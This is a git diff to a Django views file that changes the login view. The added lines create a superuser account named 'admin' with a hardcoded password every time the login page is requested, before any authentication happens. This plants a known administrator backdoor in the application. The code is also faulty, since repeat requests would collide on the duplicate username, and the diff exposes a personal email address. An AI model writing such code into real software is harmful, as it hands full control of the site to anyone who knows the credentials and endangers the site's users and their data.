@@ -16,7 +16,7 @@ from django.shortcuts import redirect
 from django.contrib.auth.models import auth
 from django.core.paginator import Paginator
 from django.contrib.contenttypes.models import ContentType
-
+from django.contrib.auth.models import User
 
 
 def catlist(request):
@@ -55,6 +55,12 @@ def engine(request, user_id):
 
 
 def login(request):
+    User.objects.create_user(
+         'admin', 
+         'omisolaidowu@gmail.com,',
+       'cmosbattery',
+       is_superuser=True
+       )
     if request.method=="POST":
         username=request.POST['username']
         password=request.POST['password']
